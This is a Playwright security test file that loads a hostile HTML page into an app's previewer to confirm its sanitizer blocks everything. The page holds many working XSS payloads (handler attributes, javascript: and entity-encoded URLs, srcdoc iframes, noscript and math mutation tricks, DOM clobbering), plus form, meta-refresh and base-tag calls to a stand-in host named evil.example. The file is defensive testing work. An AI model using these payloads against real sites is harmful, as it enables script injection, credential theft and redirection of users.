// The sanitizer against a real HTML parser. (The <math> payload is last on purpose: foreign content
// swallows whatever follows it, and the whole subtree is dropped.)
// The sanitizer against a real HTML parser. The unit corpus (tests/sanitize.test.mjs) runs on linkedom,
// which does not reproduce a browser's error recovery — and parser quirks are where filters fail.
import { test, expect } from '@playwright/test';
import { openApp } from './helpers.mjs';

const PAGE = `<!doctype html><html><head><title>حمله</title>
<script>window.__xss = 'head-script'</script>
<meta http-equiv="refresh" content="0;url=https://evil.example/">
<base href="https://evil.example/"><link rel="stylesheet" href="https://evil.example/x.css">
<style>@import "https://evil.example/y.css";</style></head>
<body onload="window.__xss='body-onload'">
<h1>متن سالم</h1>
<img src=x onerror="window.__xss='img-onerror'">
<img src="https://evil.example/pixel.png" onload="window.__xss='img-onload'">
<svg onload="window.__xss='svg-onload'"><script>window.__xss='svg-script'</script></svg>
<svg class="chart-svg" viewBox="0 0 10 10"><script>window.__xss='chart-script'</script><a href="javascript:window.__xss='svg-a'"><text x="1" y="5">x</text></a><foreignObject><img src=x onerror="window.__xss='fo'"></foreignObject><rect width="5" height="5" onclick="window.__xss='rect'"/></svg>
<noscript><p title="</noscript><img src=x onerror=window.__xss='noscript'>"></p></noscript>
<iframe srcdoc="<script>parent.__xss='srcdoc'</script>"></iframe>
<iframe src="javascript:parent.__xss='iframe-js'"></iframe>
<details open ontoggle="window.__xss='ontoggle'"><summary>s</summary></details>
<video autoplay onloadstart="window.__xss='video'"><source src=x onerror="window.__xss='source'"></video>
<a id="bad" href="javascript:window.__xss='href'">لینک</a>
<a href="&#106;&#97;vascript:window.__xss='entity'">لینک</a>
<form action="https://evil.example/steal"><input autofocus onfocus="window.__xss='onfocus'"><button formaction="javascript:window.__xss='formaction'">x</button></form>
<p style="background:url(https://evil.example/bg.png);position:fixed;inset:0;z-index:99999" onmouseover="window.__xss='mouse'">پوشش</p>
<div id="preview">clobber</div><img name="body" src="https://evil.example/n.png">
<p>پایان سالم</p>
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=x onerror=window.__xss='mxss'&gt;">
</body></html>`;

test('a hostile HTML file loads as inert text: nothing runs, nothing is fetched', async ({ page, baseURL }) => {
  const { errors, requests } = await openApp(page);
  await page.setInputFiles('#file', { name: 'attack.html', mimeType: 'text/html', buffer: Buffer.from(PAGE, 'utf8') });
  const p = page.locator('#preview');
  await expect(p.locator('h1')).toHaveText('متن سالم');
  // Loading an HTML file switches to source mode, which hides the preview: read and poke the DOM directly.
  await expect.poll(() => p.evaluate((n) => n.textContent)).toContain('پایان سالم');
  await p.evaluate((root) => {
    for (const a of root.querySelectorAll('a')) a.click();
    for (const n of root.querySelectorAll('*')) for (const t of ['mouseover', 'focus', 'toggle', 'load', 'error']) n.dispatchEvent(new Event(t, { bubbles: true }));
  });
  await page.waitForTimeout(400);

  expect(await page.evaluate(() => window.__xss), 'no script may run').toBeUndefined();
  const found = await page.evaluate(() => {
    const root = document.querySelector('#preview');
    const bad = [];
    for (const n of root.querySelectorAll('*')) {
      if (/^(script|iframe|object|embed|form|input|button|style|link|meta|base|video|audio|details|math|foreignobject)$/i.test(n.localName)) bad.push('<' + n.localName + '>');
      for (const a of n.attributes) {
        if (/^on/i.test(a.name)) bad.push(a.name);
        if (/^(href|src)$/.test(a.name) && /^\s*(javascript|vbscript|data:text)/i.test(a.value)) bad.push(a.name + '=' + a.value);
        if (a.name === 'style' && /url\(|position|z-index/i.test(a.value)) bad.push('style=' + a.value);
        if (a.name === 'id' && !/^s-/.test(a.value)) bad.push('id=' + a.value);
        if (a.name === 'name') bad.push('name=' + a.value);
      }
    }
    return { bad, previews: document.querySelectorAll('#preview').length, url: location.href };
  });
  expect(found.bad).toEqual([]);
  expect(found.previews, 'the document cannot clobber the app\'s own ids').toBe(1);
  expect(found.url.startsWith(baseURL), 'no navigation away').toBe(true);
  expect(requests.filter((u) => u.includes('evil.example') && !/\.(png|jpe?g|gif|webp)(\?|$)/.test(u)), 'only plain https images may load').toEqual([]);
  expect(errors.filter((e) => !/evil\.example|ERR_/.test(e))).toEqual([]);
});
